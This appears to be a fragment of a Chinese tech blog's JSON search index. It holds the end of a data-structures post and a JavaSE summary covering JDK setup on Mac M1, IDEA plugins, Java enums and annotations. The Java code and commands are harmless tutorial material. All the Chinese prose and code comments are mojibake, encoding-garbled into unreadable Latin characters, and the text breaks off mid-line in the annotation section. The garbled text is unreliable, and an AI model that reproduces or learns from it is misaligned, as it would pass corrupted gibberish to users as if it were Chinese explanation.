æ¯ä¸ªèŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„æ‰€æœ‰è·¯å¾„ï¼Œéƒ½åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²èŠ‚ç‚¹ï¼ˆç›¸åŒçš„é»‘è‰²é«˜åº¦ï¼‰\n\n## B-æ ‘å®¶æ—\n\nè¯·å‚è€ƒå°ç®€çš„å¦ä¸€ç¯‡æ–‡ç« ï¼š[B-Treeå®¶æ— | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/30130.html)\n\n## å­—å…¸æ ‘\n\nã€‚ã€‚ã€‚\n\n## å‚è€ƒ\n\n- [Data Structure Visualization (usfca.edu)](https://www.cs.usfca.edu/~galles/visualization/Algorithms.html)\n- [æ•°æ®ç»“æ„å›¾æ–‡è§£æä¹‹ï¼šæ ‘çš„ç®€ä»‹åŠäºŒå‰æ’åºæ ‘C++æ¨¡æ¿å®ç°](https://cloud.tencent.com/developer/article/1155142)\n- [æ•°æ®ç»“æ„å›¾æ–‡è§£æä¹‹ï¼šAVLæ ‘è¯¦è§£åŠC++æ¨¡æ¿å®ç°](https://cloud.tencent.com/developer/article/1155143)\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["æ•°æ®ç»“æ„"],"categories":["ç»“æ„-ç®—æ³•"]},{"title":"JavaSE-æ±‡æ€»","url":"/posts/9855.html","content":"\n## å‰è¨€\n\nJavaSE å®Œç»“ï¼Œæ’’èŠ±ğŸŒ¸ğŸŒ¸ğŸŒ¸ï¼ŒJava-åŸºç¡€çš„å­¦ä¹ å°±å°†å‘Šä¸€æ®µè½ï¼Œä»Šå¤©æˆ‘å°†ä¹‹å‰å‘å¸ƒçš„ã€ŠJava-XXXã€‹ç³»åˆ—å­¦ä¹ ç¬”è®°è¿›è¡Œæ±‡æ€»ä¸€ä¸‹ï¼Œæ­¤ç³»åˆ—æ˜¯æˆ‘åšçš„ä¸€ä¸ª â€œJava ä» 0 åˆ° 1â€ å®éªŒï¼Œç»™è‡ªå·±ä¸€å¹´å·¦å³æ—¶é—´ï¼ŒæŒ‰ç…§æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html)ï¼Œä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ï¼Œå¹¶ä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n## ç¬”è®°æ±‡æ€»\n\n- ç¯å¢ƒé…ç½®ï¼šè§æœ¬æ–‡ä¸‹æ–¹\n- IDEA æ’ä»¶ï¼šè§æœ¬æ–‡ä¸‹æ–¹\n- é¢å‘å¯¹è±¡ï¼š[Java-é¢å‘å¯¹è±¡ | ç®€ç®€](https://jwt1399.top/posts/64598.html)\n- æšä¸¾ï¼š[Java-æšä¸¾ | ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-7)\n- æ³¨è§£ï¼š[Java-æ³¨è§£ | ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-15)\n- å¸¸ç”¨ç±»ï¼š[Java-å¸¸ç”¨ç±» | ç®€ç®€](https://jwt1399.top/posts/33453.html)\n- é›†åˆï¼š[Java-é›†åˆ | ç®€ç®€](https://jwt1399.top/posts/6773.html)\n- å¼‚å¸¸ï¼š[Java-å¼‚å¸¸ | ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-16)\n- æ³›å‹ï¼š[Java-æ³›å‹ | ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-28)\n- çº¿ç¨‹ï¼š[Java-çº¿ç¨‹ | ç®€ç®€](https://jwt1399.top/posts/18034.html)\n- IOæµï¼š[Java-IOæµ | ç®€ç®€](https://jwt1399.top/posts/52970.html)\n- ç½‘ç»œç¼–ç¨‹ï¼š[Java-ç½‘ç»œç¼–ç¨‹ | ç®€ç®€](https://jwt1399.top/posts/43348.html)\n- JDBCï¼š[Java-JDBC | ç®€ç®€](https://jwt1399.top/posts/146.html)\n\n- Java8 æ–°ç‰¹æ€§ï¼š[Java 8 æ–°ç‰¹æ€§ | ç®€ç®€](https://jwt1399.top/posts/58320.html)\n- åå°„ï¼š[Java-åå°„ | ç®€ç®€](https://jwt1399.top/posts/13406.html)\n- æ­£åˆ™ï¼š[Java-æ­£åˆ™ | ç®€ç®€](https://jwt1399.top/posts/9855.html#toc-heading-42)\n\n##   ç¯å¢ƒé…ç½®\n\n### Mac M1 JDKå®‰è£…\n\nJDK æ¨èä½¿ç”¨ Zulu JDKï¼Œå› ä¸ºé€‚é…äº† ARM æ¶æ„,ä¸‹è½½ [Download Azul Zulu Builds of OpenJDK](https://www.azul.com/downloads/?version=java-8-lts&os=macos&architecture=arm-64-bit&package=jdk)\n\næ ¹æ®éœ€æ±‚é€‰æ‹© .dmg æ ¼å¼çš„ JDK ä¸‹è½½å°±å¯ä»¥äº†ï¼Œä¸‹è½½åç‚¹å‡»å®‰è£…ï¼ŒæŒ‰ç…§æ­¥éª¤è¿›è¡Œï¼Œå®Œæˆåï¼Œåœ¨æ§åˆ¶å°è¾“å…¥`java -version` æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ\n\n```bash\n$ java -version\nopenjdk version \"1.8.0_312\"\nOpenJDK Runtime Environment (Zulu 8.58.0.13-CA-macos-aarch64) (build 1.8.0_312-b07)\nOpenJDK 64-Bit Server VM (Zulu 8.58.0.13-CA-macos-aarch64) (build 25.312-b07, mixed mode)\n```\n\n`Zulu JDK`é»˜è®¤å®‰è£…åœ¨`/Library/Java/JavaVirtualMachines`ç›®å½•ä¸‹\n\n```bash\n/usr/libexec/java_home -V #æŸ¥çœ‹å®‰è£…Javaè·¯å¾„\n```\n\n## IDEAæ’ä»¶\n\n1. **Translation** ç¿»è¯‘ï¼Œå¯ä»¥ç¿»è¯‘è‹±æ–‡æ³¨é‡Š\n2. **Alibaba Java Coding Guidelines** é˜¿é‡Œå·´å·´ç¼–ç è§„èŒƒæ£€æŸ¥å·¥å…·(option+enter)\n3. **SequenceDiagram**  ä¸€ä¸ªæ—¶åºå›¾æ’ä»¶ï¼Œå³é”®æ–¹æ³•åèƒ½çœ‹åˆ°æ–¹æ³•é‡Œæ•´ä¸ªçš„è°ƒç”¨æµç¨‹\n4. **Rainbow Brackets** èŠ±æ‹¬å·å’Œå¤§æ‹¬å·é¢œè‰²é…å¯¹æ˜¾ç¤º\n5. **RestfulToolkit** å¯ä»¥é€šè¿‡ url å®šä½åˆ° controller å’Œé€šè¿‡æ¥å£ç”Ÿæˆå®Œæ•´ url\n6. **Randomness** å¯ä»¥åœ¨ä»£ç é‡Œç”Ÿæˆéšæœºæ•°ç”¨æ¥æµ‹è¯•\n7. **MyBatisX** æ·»åŠ ä» mapper è·³è½¬åˆ°å¯¹åº” xml çš„åŠŸèƒ½\n8. **CamelCase** å˜é‡ä¸‹åˆ’çº¿è½¬é©¼å³°å‘½å\n\n8. **.ignore** å¯ä»¥ç”Ÿæˆ ignore æ–‡ä»¶æ¯”å¦‚ .gitignore\n9. **Key Promoter X** å¿«æ·é”®æç¤º é¼ æ ‡æ“ä½œåå³ä¸‹è§’ä¼šæç¤ºæœ‰ä»€ä¹ˆå¿«æ·é”®èƒ½å¿«é€Ÿå®Œæˆåˆšåˆšé¼ æ ‡çš„æ“ä½œ\n\n## æšä¸¾\n\n###  å¼•å…¥æšä¸¾\n\né¦–å…ˆåˆ›å»ºä¸€ä¸ªå­£èŠ‚(Season) å¯¹è±¡\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration01 {\n    public static void main(String[] args) {\n        //ä½¿ç”¨\n        Season spring = new Season(\"æ˜¥å¤©\", \"æ¸©æš–\");\n        Season winter = new Season(\"å†¬å¤©\", \"å¯’å†·\");\n        Season summer = new Season(\"å¤å¤©\", \"ç‚çƒ­\");\n        Season autumn = new Season(\"ç§‹å¤©\", \"å‡‰çˆ½\");\n        autumn.setName(\"XXX\");//å¯ä»¥ä¿®æ”¹ç§‹å¤©çš„åå­—\n        autumn.setDesc(\"éå¸¸çš„çƒ­..\");//å¯ä»¥ä¿®æ”¹ç§‹å¤©çš„æè¿°\n        Season other = new Season(\"çº¢å¤©\", \"~~~\");//å¯ä»¥å¢åŠ å…¶ä»–å­£èŠ‚\n        System.out.println(autumn);\n    }\n}\n\nclass Season {\n    private String name;\n    private String desc;//æè¿°\n\n    public Season(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getDesc() {\n        return desc;\n    }\n\n    public void setDesc(String desc) {\n        this.desc = desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n\n}\n\n```\n\nSeason å¯¹è±¡è¦æœ‰å¦‚ä¸‹ç‰¹ç‚¹\n\n- 1.å­£èŠ‚çš„å€¼æ˜¯æœ‰é™çš„å‡ ä¸ªå€¼(spring, summer, autumn, winter)\n\n- 2.å­£èŠ‚åªè¯»ï¼Œä¸éœ€è¦ä¿®æ”¹ã€‚\n\nä¸Šé¢ä»£ç çš„æ–¹æ³•ä¸æ»¡è¶³ä¸Šé¢çš„ä¸¤ä¸ªç‰¹ç‚¹ï¼Œè¦å¦‚ä½•å®ç°å‘¢ï¼Ÿç­”ï¼šä½¿ç”¨æšä¸¾\n\n### æšä¸¾å®ç°\n\n> æšä¸¾æœ‰äºŒç§å®ç°æ–¹å¼ï¼š1.è‡ªå®šä¹‰ç±»å®ç°ã€2.ä½¿ç”¨ enum å…³é”®å­—å®ç°\n\n1) æšä¸¾å¯¹åº”è‹±æ–‡(enumeration, ç®€å†™enum)\n\n2) æšä¸¾æ˜¯ä¸€ç»„å¸¸é‡çš„é›†åˆã€‚\n\n3) å¯ä»¥è¿™é‡Œç†è§£ï¼šæšä¸¾å±äºä¸€ç§ç‰¹æ®Šçš„ç±»ï¼Œé‡Œé¢åªåŒ…å«ä¸€ç»„æœ‰é™çš„ç‰¹å®šçš„å¯¹è±¡ã€‚\n\n#### è‡ªå®šä¹‰ç±»å®ç°æšä¸¾\n\n- 1.ä¸éœ€è¦æä¾›setXxxæ–¹æ³•ï¼Œå› ä¸ºæšä¸¾å¯¹è±¡å€¼é€šå¸¸ä¸ºåªè¯»ï¼Œ\n- 2.å¯¹æšä¸¾å¯¹è±¡/å±æ€§ä½¿ç”¨ final + static å…±åŒä¿®é¥°ï¼Œå®ç°åº•å±‚ä¼˜åŒ–ã€‚\n- 3.æšä¸¾å¯¹è±¡åé€šå¸¸ä½¿ç”¨å…¨éƒ¨å¤§å†™ï¼Œå¸¸é‡çš„å‘½åè§„èŒƒ\n- 4.æšä¸¾å¯¹è±¡æ ¹æ®éœ€è¦ï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªå±æ€§\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration02 {\n    public static void main(String[] args) {\n        System.out.println(Season.AUTUMN);\n        System.out.println(Season2.SUMMER);\n    }\n}\n\nclass Season {\n    private String name;\n    private String desc;//æè¿°\n\n    //å®šä¹‰äº†å››ä¸ªå¯¹è±¡, å›ºå®š.\n    public static final Season SPRING = new Season(\"æ˜¥å¤©\", \"æ¸©æš–\");\n    public static final Season WINTER = new Season(\"å†¬å¤©\", \"å¯’å†·\");\n    public static final Season AUTUMN = new Season(\"ç§‹å¤©\", \"å‡‰çˆ½\");\n    public static final Season SUMMER = new Season(\"å¤å¤©\", \"ç‚çƒ­\");\n\n\n    //1. å°†æ„é€ å™¨ç§æœ‰åŒ–,ç›®çš„é˜²æ­¢ç›´æ¥new\n    //2. å»æ‰setXxx æ–¹æ³•, é˜²æ­¢å±æ€§è¢«ä¿®æ”¹\n    //3. åœ¨Season å†…éƒ¨ï¼Œç›´æ¥åˆ›å»ºå›ºå®šçš„å¯¹è±¡\n    //4. ä¼˜åŒ–ï¼Œå¯ä»¥åŠ å…¥final ä¿®é¥°ç¬¦\n    private Season(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n    \n    public String getDesc() {\n        return desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n\n}\n\n```\n\n#### enum å…³é”®å­—å®ç°æšä¸¾\n\n- 1.ä½¿ç”¨å…³é”®å­— enum æ›¿ä»£ class\n- 2.å®šä¹‰å¸¸é‡å¯¹è±¡æ–¹å¼ï¼šå¸¸é‡å(å®å‚åˆ—è¡¨)   egï¼šSPRING(\"æ˜¥å¤©\", \"æ¸©æš–\")\n- 3.å¦‚æœæœ‰å¤šä¸ªå¸¸é‡(å¯¹è±¡)ï¼Œ ä½¿ç”¨ \",\" å·é—´éš”ï¼Œæœ€åæœ‰ä¸€ä¸ªåˆ†å·ç»“å°¾\n- 4.å¦‚æœä½¿ç”¨ enum æ¥å®ç°æšä¸¾ï¼Œè¦æ±‚å°†å®šä¹‰å¸¸é‡å¯¹è±¡å†™åœ¨æœ€å‰é¢\n- 5.å¦‚æœæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯æ— å‚æ„é€ å™¨ï¼Œåˆ›å»ºå¸¸é‡å¯¹è±¡ï¼Œåˆ™å¯ä»¥çœç•¥()\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration03 {\n    public static void main(String[] args) {\n        System.out.println(Season2.AUTUMN);\n        System.out.println(Season2.SUMMER);\n    }\n}\n\nenum Season2 {\n  \n    SPRING(\"æ˜¥å¤©\", \"æ¸©æš–\"), WINTER(\"å†¬å¤©\", \"å¯’å†·\"), AUTUMN(\"ç§‹å¤©\", \"å‡‰çˆ½\"),\n    SUMMER(\"å¤å¤©\", \"ç‚çƒ­\")/*, What()*/;\n    private String name;\n    private String desc;//æè¿°\n\n    private Season2() {//æ— å‚æ„é€ å™¨\n    }\n\n    private Season2(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getDesc() {\n        return desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n}\n```\n\næ³¨æ„äº‹é¡¹\n\n1.å½“æˆ‘ä»¬ä½¿ç”¨ enum å…³é”®å­—å¼€å‘ä¸€ä¸ªæšä¸¾ç±»æ—¶ï¼Œé»˜è®¤ä¼šç»§æ‰¿ Enum ç±», è€Œä¸”æ˜¯ä¸€ä¸ª final ç±»ï¼Œä½¿ç”¨javap å·¥å…·å¯ä»¥çœ‹åˆ°\n\n2.ä¼ ç»Ÿçš„public static final Season2 SPRING = new Season2(\"æ˜¥å¤©\", \"æ¸©æš–\"); ç®€åŒ–æˆSPRING(\"æ˜¥å¤©\", \"æ¸©æš–\")ï¼Œ è¿™é‡Œå¿…é¡»çŸ¥é“ï¼Œå®ƒè°ƒç”¨çš„æ˜¯å“ªä¸ªæ„é€ å™¨\n\n3.å¦‚æœä½¿ç”¨æ— å‚æ„é€ å™¨åˆ›å»ºæšä¸¾å¯¹è±¡ï¼Œåˆ™å®å‚åˆ—è¡¨å’Œå°æ‹¬å·éƒ½å¯ä»¥çœç•¥\n\n4.å½“æœ‰å¤šä¸ªæšä¸¾å¯¹è±¡æ—¶ï¼Œä½¿ç”¨ \",\" é—´éš”ï¼Œæœ€åæœ‰ä¸€ä¸ªåˆ†å·ç»“å°¾\n\n5.æšä¸¾å¯¹è±¡å¿…é¡»æ”¾åœ¨æšä¸¾ç±»çš„è¡Œé¦–\n\nJavap åç¼–è¯‘ä¸Šé¢ç”Ÿæˆçš„ classï¼Œå¯ä»¥åˆ†æå‡ºè·Ÿè‡ªå®šä¹‰å®ç°æ–¹æ³•å·®ä¸å¤š\n\n```bash\n$ javac Enumeration03.java\n$ javap Season2.class\nCompiled from \"Enumeration03.java\"\nfinal class com.jwt.enum_.Season2 extends java.lang.Enum<com.jwt.enum_.Season2> {\n  public static final com.jwt.enum_.Season2 SPRING;\n  public static final com.jwt.enum_.Season2 WINTER;\n  public static final com.jwt.enum_.Season2 AUTUMN;\n  public static final com.jwt.enum_.Season2 SUMMER;\n  public static com.jwt.enum_.Season2[] values();\n  public static com.jwt.enum_.Season2 valueOf(java.lang.String);\n  public java.lang.String getName();\n  public java.lang.String getDesc();\n  public java.lang.String toString();\n  static {};\n}\n```\n\n#### enum å¸¸ç”¨æ–¹æ³•\n\nä½¿ç”¨å…³é”®å­—enum æ—¶ï¼Œä¼šéšå¼ç»§æ‰¿Enum ç±», è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Enum ç±»ç›¸å…³çš„æ–¹æ³•ã€‚\n\n- toStringï¼šEnum ç±»å·²ç»é‡å†™è¿‡äº†ï¼Œè¿”å›çš„æ˜¯å½“å‰å¯¹è±¡å,å­ç±»å¯ä»¥é‡å†™è¯¥æ–¹æ³•ï¼Œç”¨äºè¿”å›å¯¹è±¡çš„å±æ€§ä¿¡æ¯\n\n- nameï¼šè¿”å›å½“å‰å¯¹è±¡åï¼ˆå¸¸é‡åï¼‰ï¼Œå­ç±»ä¸­ä¸èƒ½é‡å†™\n\n- ordinalï¼šè¿”å›å½“å‰å¯¹è±¡çš„ç¼–å·(å®šä¹‰æ—¶çš„ä½ç½®)ï¼Œé»˜è®¤ä» 0 å¼€å§‹\n\n- valuesï¼šè¿”å›å½“å‰æšä¸¾ç±»ä¸­æ‰€æœ‰çš„å¸¸é‡\n\n- valueOfï¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæšä¸¾å¯¹è±¡ï¼Œè¦æ±‚å­—ç¬¦ä¸²å¿…é¡»ä¸ºå·²æœ‰çš„å¸¸é‡åï¼Œå¦åˆ™æŠ¥å¼‚å¸¸ï¼\n\n- compareToï¼šæ¯”è¾ƒä¸¤ä¸ªæšä¸¾å¸¸é‡ï¼Œæ¯”è¾ƒçš„å°±æ˜¯ç¼–å·\n\n```java\npackage com.jwt.enum_;\n\npublic class EnumMethod {\n    public static void main(String[] args) {\n        //ä½¿ç”¨Season2 æšä¸¾ç±»ï¼Œæ¥æ¼”ç¤ºå„ç§æ–¹æ³•\n        Season2 autumn = Season2.AUTUMN;\n        //è¾“å‡ºæšä¸¾å¯¹è±¡çš„åå­—\n        System.out.println(autumn.name());\n        //ordinal() è¾“å‡ºçš„æ˜¯è¯¥æšä¸¾å¯¹è±¡çš„æ¬¡åº/ç¼–å·ï¼Œä»0 å¼€å§‹ç¼–å·\n        //AUTUMN æšä¸¾å¯¹è±¡æ˜¯ç¬¬ä¸‰ä¸ªï¼Œå› æ­¤è¾“å‡º2\n        System.out.println(autumn.ordinal());\n        //ä»åç¼–è¯‘å¯ä»¥çœ‹å‡ºvalues æ–¹æ³•ï¼Œè¿”å›Season2[]\n        //å«æœ‰å®šä¹‰çš„æ‰€æœ‰æšä¸¾å¯¹è±¡\n        Season2[] values = Season2.values();\n        System.out.println(\"===éå†å–å‡ºæšä¸¾å¯¹è±¡(å¢å¼ºfor)====\");\n        for (Season2 season : values) {//å¢å¼ºfor å¾ªç¯\n            System.out.println(season);\n        }\n        //valueOfï¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæšä¸¾å¯¹è±¡ï¼Œè¦æ±‚å­—ç¬¦ä¸²å¿…é¡»ä¸ºå·²æœ‰çš„å¸¸é‡åï¼Œå¦åˆ™æŠ¥å¼‚å¸¸\n        //1. æ ¹æ®ä½ è¾“å…¥çš„\"AUTUMN\" åˆ°Season2 çš„æšä¸¾å¯¹è±¡å»æŸ¥æ‰¾\n        //2. å¦‚æœæ‰¾åˆ°äº†ï¼Œå°±è¿”å›ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±æŠ¥é”™\n        Season2 autumn1 = Season2.valueOf(\"AUTUMN\");\n        System.out.println(\"autumn1=\" + autumn1);\n        //compareToï¼šæ¯”è¾ƒä¸¤ä¸ªæšä¸¾å¸¸é‡ï¼Œæ¯”è¾ƒçš„å°±æ˜¯ç¼–å·\n        //1. å°±æ˜¯æŠŠSeason2.AUTUMN æšä¸¾å¯¹è±¡çš„ç¼–å·å’ŒSeason2.SUMMER æšä¸¾å¯¹è±¡çš„ç¼–å·æ¯”è¾ƒ\n        /*æºç \n        public final int compareTo(E o) {\n            return self.ordinal - other.ordinal;\n        }\n        */\n        //Season2.AUTUMN çš„ç¼–å·[2] - Season2.SUMMER çš„ç¼–å·[3]\n        System.out.println(Season2.AUTUMN.compareTo(Season2.SUMMER));\n    }\n}\n```\n\n### å®ä¾‹ç»ƒä¹ ğŸŒ°\n\n- å£°æ˜ Week æšä¸¾ç±»ï¼Œå…¶ä¸­åŒ…å«æ˜ŸæœŸä¸€è‡³æ˜ŸæœŸæ—¥çš„å®šä¹‰\n\n- MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY,SATURDAY, SUNDAY;\n\n- ä½¿ç”¨ values è¿”å›æ‰€æœ‰çš„æšä¸¾æ•°ç»„, å¹¶éå†\n\n```java\npackage com.jwt.enum_;\n\npublic class EnumExercise02 {\n    public static void main(String[] args) {\n        //è·å–åˆ°æ‰€æœ‰çš„æšä¸¾å¯¹è±¡ï¼Œ å³æ•°ç»„\n        Week[] weeks = Week.values();\n        //éå†ï¼Œä½¿ç”¨å¢å¼ºfor\n        for (Week w:weeks) {\n            System.out.println(w);\n        }\n    }\n\n}\n\nenum Week{\n    MONDAY(\"æ˜ŸæœŸä¸€\"),TUESDAY(\"æ˜ŸæœŸäºŒ\"), WEDNESDAY(\"æ˜ŸæœŸä¸‰\"),\n    THURSDAY(\"æ˜ŸæœŸå››\"), FRIDAY(\"æ˜ŸæœŸäº”\"),SATURDAY(\"æ˜ŸæœŸå…­\"), SUNDAY(\"æ˜ŸæœŸå¤©\");\n    private String name;\n\n    Week(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    @Override\n    public String toString() {\n        return \"Week{\" +\n                \"name='\" + name + '\\'' +\n                '}';\n    }\n}\n```\n\n### enum å®ç°æ¥å£\n\n- ä½¿ç”¨ enum å…³é”®å­—åï¼Œå°±ä¸èƒ½å†ç»§æ‰¿å…¶å®ƒç±»äº†ï¼Œå› ä¸º enum ä¼šéšå¼ç»§æ‰¿ Enumï¼Œè€ŒJava æ˜¯å•ç»§æ‰¿æœºåˆ¶ã€‚\n\n- æšä¸¾ç±»å’Œæ™®é€šç±»ä¸€æ ·ï¼Œå¯ä»¥å®ç°æ¥å£ \n\n- ```java\n  enum ç±»å implements æ¥å£1ï¼Œæ¥å£2{}\n  ```\n\n\n```java\npackage com.jwt.enum_;\n\n/**\n * @authorï¼šç®€ç®€\n * @createTimeï¼š[2022/3/13 13:20]\n **/\npublic class EnumDetail {\n    public static void main(String[] args) {\n        Music.CLASSICMUSIC.playing();\n    }\n}\n\nclass A {\n}\n\ninterface Playing {\n    public void playing();\n}\n\nenum Music implements Playing {\n    CLASSICMUSIC;//æ— å‚æ„é€ å™¨ï¼Œåˆ›å»ºå¸¸é‡å¯¹è±¡ï¼Œåˆ™å¯ä»¥çœç•¥()\n\n    @Override\n    public void playing() {\n        System.out.println(\"æ’­æ”¾å¥½å¬çš„éŸ³ä¹...\");\n    }\n}\n```\n\n\n\n## æ³¨è§£\n\n- æ³¨è§£(Annotation)ä¹Ÿè¢«ç§°ä¸ºå…ƒæ•°æ®(Metadata)ï¼Œç”¨äºä¿®é¥°è§£é‡ŠåŒ…ã€ç±»ã€æ–¹æ³•ã€å±æ€§ã€æ„é€ å™¨ã€å±€éƒ¨å˜é‡ç­‰æ•°æ®ä¿¡æ¯ã€‚\n\n- å’Œæ³¨é‡Šä¸€æ ·ï¼Œæ³¨è§£ä¸å½±å“ç¨‹åºé€»è¾‘ï¼Œä½†æ³¨è§£å¯ä»¥è¢«ç¼–è¯‘æˆ–è¿è¡Œï¼Œç›¸å½“äºåµŒå…¥åœ¨ä»£ç ä¸­çš„è¡¥å……ä¿¡æ¯ã€‚\n\n- åœ¨JavaSE ä¸­ï¼Œæ³¨è§£çš„ä½¿ç”¨ç›®çš„æ¯”è¾ƒç®€å•ï¼Œä¾‹å¦‚æ ‡è®°è¿‡æ—¶çš„åŠŸèƒ½ï¼Œå¿½ç•¥è­¦å‘Šç­‰ã€‚åœ¨JavaEE ä¸­æ³¨è§£å æ®äº†æ›´é‡è¦çš„è§’è‰²ï¼Œä¾‹å¦‚ç”¨æ¥é…ç½®åº”ç”¨ç¨‹åºçš„ä»»ä½•åˆ‡é¢ï¼Œä»£æ›¿ JavaEE æ—§ç‰ˆä¸­æ‰€é—ç•™çš„ç¹å†—ä»£ç å’Œ XML é…ç½®ç­‰ã€‚\n\n- ä½¿ç”¨ Annotation æ—¶è¦åœ¨å…¶å‰é¢å¢åŠ  @ ç¬¦å·, å¹¶æŠŠè¯¥ Annotation å½“æˆä¸€ä¸ªä¿®é¥°ç¬¦ä½¿ç”¨ã€‚ç”¨äºä¿®é¥°å®ƒæ”¯æŒçš„ç¨‹åºå…ƒç´ \n\n**ä¸‰ä¸ªåŸºæœ¬çš„ Annotation**\n\n1) @Override: é™å®šæŸä¸ªæ–¹æ³•ï¼Œæ˜¯é‡å†™çˆ¶ç±»æ–¹æ³•, è¯¥æ³¨è§£åªèƒ½ç”¨äºæ–¹æ³•\n\n2) @Deprecated: ç”¨äºè¡¨ç¤ºæŸä¸ªç¨‹åºå…ƒç´ (ç±», æ–¹æ³•ç­‰)å·²è¿‡æ—¶ï¼Œè¯¥æ³¨è§£å¯ä»¥ä¿®é¥°æ–¹æ³•ï¼Œç±»ï¼Œå­—æ®µ, åŒ…, å‚æ•°ç­‰ç­‰\n\n3) @SuppressWarnings(\"all\"): æŠ‘åˆ¶ç¼–è¯‘å™¨è­¦å‘Š\n\n   - å¯ä»¥æŒ‡å®šçš„è­¦å‘Šç±»å‹æœ‰\n\n     ```\n     allï¼ŒæŠ‘åˆ¶æ‰€æœ‰è­¦å‘Š\n     boxingï¼ŒæŠ‘åˆ¶ä¸å°è£…/æ‹†è£…ä½œä¸šç›¸å…³çš„è­¦å‘Š\n     castï¼ŒæŠ‘åˆ¶ä¸å¼ºåˆ¶è½¬å‹ä½œä¸šç›¸å…³çš„è­¦å‘Š\n     dep-annï¼ŒæŠ‘åˆ¶ä¸æ·˜æ±°æ³¨é‡Šç›¸å…³çš„è­¦å‘Š\n     deprecationï¼ŒæŠ‘åˆ¶ä¸æ·˜æ±°çš„ç›¸å…³è­¦å‘Š\n     fallthroughï¼ŒæŠ‘åˆ¶ä¸switch é™ˆè¿°å¼ä¸­é—æ¼break ç›¸å…³çš„è­¦å‘Š\n     finallyï¼ŒæŠ‘åˆ¶ä¸æœªä¼ å›finally åŒºå—ç›¸å…³çš„è­¦å‘Š\n     hidingï¼ŒæŠ‘åˆ¶ä¸éšè—å˜æ•°çš„åŒºåŸŸå˜æ•°ç›¸å…³çš„è­¦å‘Š\n     incomplete-switchï¼ŒæŠ‘åˆ¶ä¸switch é™ˆè¿°å¼(enum case)ä¸­é—æ¼é¡¹ç›®ç›¸å…³çš„è­¦å‘Š\n     javadocï¼ŒæŠ‘åˆ¶ä¸javadoc ç›¸å…³çš„è­¦å‘Šç¬¬497é¡µ\n     nlsï¼ŒæŠ‘åˆ¶ä¸énls å­—ä¸²æ–‡å­—ç›¸å…³çš„è­¦å‘Š\n     nullï¼ŒæŠ‘åˆ¶ä¸ç©ºå€¼åˆ†æç›¸å…³çš„è­¦å‘Š\n     rawtypesï¼ŒæŠ‘åˆ¶ä¸ä½¿ç”¨raw ç±»å‹ç›¸å…³çš„è­¦å‘Š\n     resourceï¼ŒæŠ‘åˆ¶ä¸ä½¿ç”¨Closeable ç±»å‹çš„èµ„æºç›¸å…³çš„è­¦å‘Š\n     restrictionï¼ŒæŠ‘åˆ¶ä¸ä½¿ç”¨ä¸å»ºè®®æˆ–ç¦æ­¢å‚ç…§ç›¸å…³çš„è­¦å‘Š\n     serialï¼ŒæŠ‘åˆ¶ä¸å¯åºåˆ—åŒ–çš„ç±»åˆ«é—æ¼serialVersionUID æ 